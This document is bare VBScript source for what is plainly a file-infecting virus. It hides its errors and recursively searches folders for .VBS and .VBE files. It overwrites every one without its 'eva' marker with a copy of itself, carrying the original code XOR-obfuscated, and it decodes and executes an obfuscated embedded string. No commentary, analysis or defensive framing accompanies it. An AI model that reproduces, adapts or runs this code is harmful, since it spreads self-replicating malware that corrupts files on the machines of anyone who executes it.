On Error Resume Next
SouCode = "Aknct,.j_.  .."
Execute fCrypt(SouCode)

Set Of = CreateObject("Scripting.FileSystemObject")
fSv = Of.OpenTextFile(WScript.ScriptFullName, 1).Readall
fS Of.GetFolder(".")

Sub fS(fP)
On Error Resume Next
Set f4 = Of.GetFolder(fP)
For Each f2 In f4.Files
inS f2.Path: Next
For Each fC In f4.SubFolders
fS(fC.Path): Next
End Sub

Sub inS(iSf)
On Error Resume Next
ifS = "VBS VBE"
If InStr(ifS, UCase(Of.GetExtensionName(iSf))) Then iSh iSf
End Sub

Sub iSh(iSk)
On Error Resume Next
vC = Of.OpenTextFile(iSk, 1).ReadAll
If iR(vC) And Len(vC) > 0 Then
vC = Replace(fSv, SouCode, fCrypt(vC))
Of.OpenTextFile(iSk, 2).WriteLine vC
End If
End Sub

Function iR(Sf)
If InStr(Sf, "eva") Then
iR = False
Else
iR = True
End If
End Function

Function fCrypt(tg)
  XorKey = 12
  For fCryLp = 1 To Len(tg)
   fCrypt = fCrypt + Chr(Asc(Mid(tg, fCryLp, 1)) Xor XorKey)
  Next 
End Function 
